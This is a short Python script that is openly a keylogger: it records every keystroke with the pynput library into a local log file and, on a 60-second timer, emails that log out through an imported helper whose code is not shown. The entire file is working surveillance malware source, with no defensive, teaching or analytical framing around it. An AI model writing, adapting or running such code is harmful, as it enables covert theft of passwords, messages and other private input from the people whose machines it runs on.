from pynput import keyboard
import threading
import time
from email_reporter import send_logs_via_email
from utils import save_to_log

LOG_FILE = "logs/keylogs.txt"
SEND_INTERVAL = 60  # seconds

def on_press(key):
    try:
        key_text = key.char
    except AttributeError:
        key_text = f"[{key.name}]"
    save_to_log(LOG_FILE, key_text)

def report():
    send_logs_via_email(LOG_FILE)
    timer = threading.Timer(SEND_INTERVAL, report)
    timer.daemon = True
    timer.start()

if __name__ == "__main__":
    print("[*] Starting keylogger...")
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
